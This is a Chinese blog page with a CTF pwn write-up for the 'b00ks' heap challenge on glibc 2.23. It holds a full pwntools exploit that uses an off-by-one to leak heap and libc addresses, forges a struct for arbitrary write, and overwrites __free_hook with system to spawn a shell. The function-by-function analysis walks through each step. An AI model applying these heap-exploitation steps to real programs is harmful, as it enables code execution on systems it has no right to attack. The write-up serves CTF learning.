@@ -1,0 +1,1068 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Yk2eR0">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Yk2eR0">
+    
+    <meta name="keywords" content="Yk2,hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>b00ks · Yk2eR0&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Yk2eR0&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">b00ks</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Yk2eR0's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            b00ks
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Pwn">Pwn</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2021/04/16</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>环境:ub16.04 x64 glibc2.23</p>
+</blockquote>
+<p>菜单题,先看下保护:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> checksec</span></span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : FULL</span><br></pre></td></tr></table></figure>
+
+<p>要先泄露偏移;不能覆写got表</p>
+<h2 id="PAYLOAD"><a href="#PAYLOAD" class="headerlink" title="PAYLOAD"></a>PAYLOAD</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">s &#x3D; lambda data: sh.send(data)</span><br><span class="line">sa &#x3D; lambda delim, data: sh.sendafter(delim, data)</span><br><span class="line">sl &#x3D; lambda data: sh.sendline(data)</span><br><span class="line">sla &#x3D; lambda delim, data: sh.sendlineafter(delim, data)</span><br><span class="line">sea &#x3D; lambda delim, data: sh.sendafter(delim, data)</span><br><span class="line">r &#x3D; lambda numb&#x3D;4096: sh.recv(numb)</span><br><span class="line">ru &#x3D; lambda delims, drop&#x3D;True: sh.recvuntil(delims, drop)</span><br><span class="line">info_addr &#x3D; lambda tag, addr: sh.info(tag + &#39;: &#123;:#x&#125;&#39;.format(addr))</span><br><span class="line">itr &#x3D; lambda: sh.interactive()</span><br><span class="line">debug &#x3D; lambda command&#x3D;&#39;&#39;: gdb.attach(sh, command)</span><br><span class="line"></span><br><span class="line">context(arch&#x3D;&#39;amd64&#39;, os&#x3D;&#39;linux&#39;, log_level&#x3D;&quot;debug&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def one_gadget(filename):</span><br><span class="line">    return map(int, subprocess.check_output([&#39;one_gadget&#39;, &#39;--raw&#39;, filename]).split(&#39; &#39;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># one_gadget(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">#libc&#x3D;LibcSearcher(&#39;puts&#39;,puts</span><br><span class="line">sh &#x3D; process([&#39;b00ks&#39;] , env&#x3D;&#123;&quot;LD_PRELOAD&quot;: &quot;libc.so.6&quot;&#125;)</span><br><span class="line">#sh&#x3D;remote(&#39;node3.buuoj.cn&#39;,26176)</span><br><span class="line">elf&#x3D;ELF(&#39;b00ks&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def create(booksize,bookde):</span><br><span class="line">    sl(b&#39;1&#39;)</span><br><span class="line">    r(0x17)</span><br><span class="line">    sl(b&#39;32&#39;)</span><br><span class="line">    ru(&#39;: &#39;)</span><br><span class="line">    sl(b&#39;a&#39;*20)</span><br><span class="line">    ru(&#39;:&#39;)</span><br><span class="line">    sl(booksize)</span><br><span class="line">    ru(&#39;:&#39;)</span><br><span class="line">    sl(bookde)</span><br><span class="line">    ru(&#39;&gt;&#39;)</span><br><span class="line">    sleep(1)</span><br><span class="line"></span><br><span class="line">def change(name):</span><br><span class="line">    sl(b&#39;5&#39;)</span><br><span class="line">    ru(&#39;:&#39;)</span><br><span class="line">    sl(bytes(name))</span><br><span class="line">    ru(&#39;&gt;&#39;)</span><br><span class="line"></span><br><span class="line">def printde(stopl):</span><br><span class="line">    sl(b&#39;4&#39;)</span><br><span class="line">    assert isinstance(stopl, bytes)</span><br><span class="line">    print(stopl)</span><br><span class="line">    ru(stopl)</span><br><span class="line"></span><br><span class="line">    a&#x3D;r(6)</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">def edit(ind,des):</span><br><span class="line">    sl(b&#39;3&#39;)</span><br><span class="line">    ru(&#39;:&#39;)</span><br><span class="line">    sl(ind)</span><br><span class="line">    ru(&#39;:&#39;)</span><br><span class="line">    sl(des)</span><br><span class="line">    ru(&#39;&gt;&#39;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">r()</span><br><span class="line">sl(b&#39;a&#39;*32)</span><br><span class="line">r(0x6f)</span><br><span class="line">change(b&#39;baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)</span><br><span class="line">create(b&#39;250&#39;,b&#39;testtest&#39;)</span><br><span class="line"></span><br><span class="line">addr&#x3D;printde(b&#39;baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)</span><br><span class="line">b1addr&#x3D;u64(addr.ljust(8,b&#39;\x00&#39;)) #struct pointer</span><br><span class="line"></span><br><span class="line">b2addr&#x3D;b1addr+0x60</span><br><span class="line">print(hex(b2addr))#leak the struct</span><br><span class="line">r()</span><br><span class="line">create(b&#39;135168&#39;,b&#39;1&#39;)#0x21000</span><br><span class="line">chunk1&#x3D;b&#39;b&#39;*0xb0+p64(1)+p64(b2addr+16)+p64(b2addr+8)+p64(0xdead)</span><br><span class="line">edit(b&#39;1&#39;,chunk1)#change ptr</span><br><span class="line">change(b&#39;baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;)#offby1</span><br><span class="line">mm&#x3D;printde(b&#39;me: &#39;)</span><br><span class="line">mmap&#x3D;u64(mm.ljust(8, b&#39;\x00&#39;))</span><br><span class="line">print(hex(mmap))</span><br><span class="line">ru(b&#39;&gt;&#39;)</span><br><span class="line"></span><br><span class="line">libc_base&#x3D;mmap-(0x7f95418aa010-0x00007f95412fb000) #debug vmmap-libc_base 0x5ca010 (0x7f95418aa010-0x00007f95412fb000)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">freehook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">system&#x3D;libc.symbols[&#39;system&#39;]+libc_base+0x10</span><br><span class="line">binsh&#x3D;0x18cd57-(0x18cc98-0x18cd58)+libc_base</span><br><span class="line">print(&#39;free&#39;+hex(freehook))</span><br><span class="line">print(hex(binsh))</span><br><span class="line">print(hex(system))</span><br><span class="line"></span><br><span class="line">chunk2&#x3D;p64(binsh)+p64(freehook)</span><br><span class="line">edit(b&#39;1&#39;,chunk2) # change ptr</span><br><span class="line">chunk3&#x3D;p64(system)</span><br><span class="line">edit(b&#39;2&#39;,chunk3)</span><br><span class="line">r()</span><br><span class="line"></span><br><span class="line">sl(b&#39;2&#39;)</span><br><span class="line">ru(b&#39;: &#39;)</span><br><span class="line">sl(b&#39;2&#39;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#pause()</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析:"></a>功能分析:</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>读取author_name,存放在全局变量区</p>
+<h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><p>创建一个结构体:{bookorder(DWORD);bookptr(QWORD);description(QWORD);descriptionsize(DWORD)}</p>
+<p>从id=1开始赋值</p>
+<p>最后指针都free了,没法uaf</p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>删除对应id的结构体,判断条件没越界(1-20)</p>
+<p>会free最小id不正常结构体的<strong>所有指针</strong></p>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p>编辑结构体的description,以’\n’结束输入</p>
+<h3 id="bookread"><a href="#bookread" class="headerlink" title="bookread"></a>bookread</h3><p>输出bookid,bookname,description,author.</p>
+<p>使用printf输出,带参数,无法fmtstr.遇’\x00’结束.</p>
+<h3 id="cinname"><a href="#cinname" class="headerlink" title="cinname"></a>cinname</h3><p>重新输入author_name,在输入a位后,第<strong>a+1</strong>位赋值为0.a最大为32,有off by one.</p>
+<p>结合bookread的遇’\x00’读可以尝试越界读</p>
+<p>遇到’\n’结束输入</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先从已知的非法访问开始:</p>
+<h3 id="实现越界读"><a href="#实现越界读" class="headerlink" title="实现越界读"></a>实现越界读</h3><p>先写32位用户名,然后创建第一个bookstruct</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">r()</span><br><span class="line">sl(<span class="string">b'a'</span>*<span class="number">32</span>)</span><br><span class="line">r(<span class="number">0x6f</span>)</span><br><span class="line">change(<span class="string">b'baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">create(<span class="string">b'250'</span>,<span class="string">b'testtest'</span>)</span><br><span class="line"></span><br><span class="line">addr=printde(<span class="string">b'baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">b1addr=u64(addr.ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) <span class="comment">#struct pointer</span></span><br><span class="line">print(hex(b1addr))<span class="comment">#leak the struct</span></span><br></pre></td></tr></table></figure>
+
+<p>发现泄露值正是该bookstruct的结构体的description_ptr.</p>
+<p><img src="/2021/04/16/b00ks/1.png" alt></p>
+<p>由于是小端序存储,那么我们在这个指针上覆盖一位0,就可以改变指针指向到低位的地址,而desptr正好指向这个结构体指针的低位,我们布置一下description,就可以伪造出一个新堆.</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><p>继续申请第二个堆,它的结构体指针就在第一个结构体指针体下方,调试出偏移,申请一个description大于0x21000的堆,此时vmmap和libc受pie相同影响,相对值恒定.伪造出如下结构的堆:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bbbbbbbbb......</span><br><span class="line">----------------------- </span><br><span class="line">|p64(1)   | struct2+16 |</span><br><span class="line">------------------------</span><br><span class="line">|struct2+8|  0xdead    |</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure>
+
+<p>p64(1)的地址最后一位为’00’</p>
+<p>此时调用change,printde,即可打印出<code>struct2+16</code>指针所指向的值.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b2addr=b1addr+<span class="number">0x60</span></span><br><span class="line">print(hex(b2addr))<span class="comment">#leak the struct</span></span><br><span class="line">r()</span><br><span class="line">create(<span class="string">b'135168'</span>,<span class="string">b'1'</span>)<span class="comment">#0x21000</span></span><br><span class="line">chunk1=<span class="string">b'b'</span>*<span class="number">0xb0</span>+p64(<span class="number">1</span>)+p64(b2addr+<span class="number">16</span>)+p64(b2addr+<span class="number">8</span>)+p64(<span class="number">0xdead</span>)</span><br><span class="line">edit(<span class="string">b'1'</span>,chunk1)<span class="comment">#change ptr</span></span><br><span class="line">change(<span class="string">b'baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)<span class="comment">#offby1</span></span><br><span class="line">mm=printde(<span class="string">b'me: '</span>)</span><br><span class="line">mmap=u64(mm.ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">print(hex(mmap))</span><br><span class="line">ru(<span class="string">b'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">libc_base=mmap-(<span class="number">0x7f95418aa010</span><span class="number">-0x00007f95412fb000</span>) <span class="comment">#debug vmmap-libc_base 0x5ca010 (0x7f95418aa010-0x00007f95412fb000)</span></span><br><span class="line">print(hex(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>调试算出偏移,即可泄露libc</p>
+<h3 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h3><p>通过edit修改book1,修改的是book2的description指针,然后再修改book2的description指针,修改的是description指针的值.</p>
+<p>利用泄露的libc获得<code>__free_hook</code>和<code>system</code>,<code>&#39;/bin/sh&#39;</code>地址.将<code>system</code>地址写入<code>__free_hook</code>.<code>&#39;/bin/sh&#39;</code>写入book2的name指针,这样delete book2后get shell了</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://www.yk2er0.fun">Yk2eR0</a>
+            <p>原文链接：<a href="https://www.yk2er0.fun/2021/04/16/b00ks/">https://www.yk2er0.fun/2021/04/16/b00ks/</a>
+            <p>发表日期：<a href="https://www.yk2er0.fun/2021/04/16/b00ks/">April 16th 2021, 7:36:44 pm</a>
+            <p>更新日期：<a href="https://www.yk2er0.fun/2021/04/16/b00ks/">April 17th 2021, 1:21:20 pm</a>
+            <p>版权声明：非商业用允许转载</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/04/17/%C2%960ctf-2017-babyheap/" title= "0ctf_2017_babyheap">
+                    <div class="nextTitle">0ctf_2017_babyheap</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/03/23/usb-new/" title= "USB简介">
+                    <div class="prevTitle">USB简介</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:yukaizzz@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fishykz" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                  
+                  <img class="profile-qr" src="/assets/QQ.jpg" />
+                </span>
+            
+        
+    
+        
+            
+                <a href="https://space.bilibili.com/347245431?share_medium=android&share_source=copy_link&bbid=XY2FED62DB4F7E324FA9ED94194EF11017031&ts=1572495457266" class="iconfont-archer bilibili" target="_blank" title=bilibili></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/assets/tree.html" class="iconfont-archer others" target="_blank" title=others></a>
+            
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
